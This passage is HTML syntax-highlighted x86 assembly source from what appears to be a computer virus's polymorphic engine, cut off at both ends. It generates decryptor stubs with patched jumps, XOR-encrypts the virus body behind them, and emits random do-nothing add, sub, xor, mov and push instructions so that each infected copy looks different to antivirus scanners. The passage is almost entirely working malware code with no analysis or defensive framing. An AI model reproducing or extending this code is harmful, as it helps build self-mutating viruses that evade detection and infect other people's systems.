        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9c66h</span><span class="sc0">       </span><span class="sc1">;pushf</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">              </span><span class="sc1">;popf</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">


        </span><span class="sc1">;---JZ OVER------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;can't generate &gt; 80h-5 bytes of garbage </span><span class="sc0">
</span><span class="sc5">regenerate</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;between JZ beh - poly - JMP - beh: code...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;restore EDI for ja </span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">      </span><span class="sc1">;80h = max JZ distance, 5 is size of JMP BACK</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">regenerate</span><span class="sc0">      


        </span><span class="sc1">;----JMP BACK----</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fffffffbh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">



        </span><span class="sc1">;----PATCH JZ----</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;esi-1 = jz value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">;----------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;----POPAD-------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                  </span><span class="sc1">;popad</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;----PATCH LEA---        </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;patch LEA reg1,[EAX+startofcrypted]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viruscopy</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virusz</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;copy encrypted virus code after poly</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;decryptors</span><span class="sc0">
</span><span class="sc5">cryptit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cryptit</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viruscopy</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;virus size + poly in ECX</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       Generates lot of rnd instructions which look good but do nothing</span><span class="sc0">
</span><span class="sc1">;       (they undo themself indirect)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">gengarbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">garbageloop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genadd</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gensub</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genxor</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genmov</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genpush</span><span class="sc0">                 </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">geninc</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gendec</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gencmp</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genjunk</span><span class="sc0">                 </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">garbageloop</span><span class="sc0">

</span><span class="sc5">exitgen</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random add</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genadd</span><span class="sc0">                          </span><span class="sc1">;4 = esp, leave him alone</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">addandsub</span><span class="sc0">                       </span><span class="sc1">;generate an add - code - sub</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetoadd</span><span class="sc0">                               </span><span class="sc1">;yep</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomadd</span><span class="sc0">                       </span><span class="sc1">;adds a value or register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetoadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomadd</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">addandsub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random sub</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">gensub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gensub</span><span class="sc0">                          </span><span class="sc1">;4 = esp, leave him alone</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">subandadd</span><span class="sc0">                       </span><span class="sc1">;generate an add - code - sub</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetosub</span><span class="sc0">                               </span><span class="sc1">;yep</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomsub</span><span class="sc0">                       </span><span class="sc1">;adds a value or register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetosub</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomsub</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">subandadd</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random xor</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genxor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genxor</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">genxorxor</span><span class="sc0">                       </span><span class="sc1">;generate an xor - code - xor</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetoxor</span><span class="sc0">                               </span><span class="sc1">;yep</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">                    </span><span class="sc1">;first push</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">                      </span><span class="sc1">;generate some garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomxor</span><span class="sc0">                       </span><span class="sc1">;xors with a value or register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">                      </span><span class="sc1">;generate some garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">                     </span><span class="sc1">;and pop it</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetoxor</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomxor</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">genxorxor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random mov</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genmov</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genmov</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">                        </span><span class="sc1">; eax &lt;- al</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetomov</span><span class="sc0">                               </span><span class="sc1">;yep</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">                    </span><span class="sc1">;first push</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">                      </span><span class="sc1">;generate some garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randommov</span><span class="sc0">                       </span><span class="sc1">;movs a value or register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">                      </span><span class="sc1">;generate some garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">                     </span><span class="sc1">;and pop it</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetomov</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randommov</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random push</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genpush</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genpush</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random inc</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
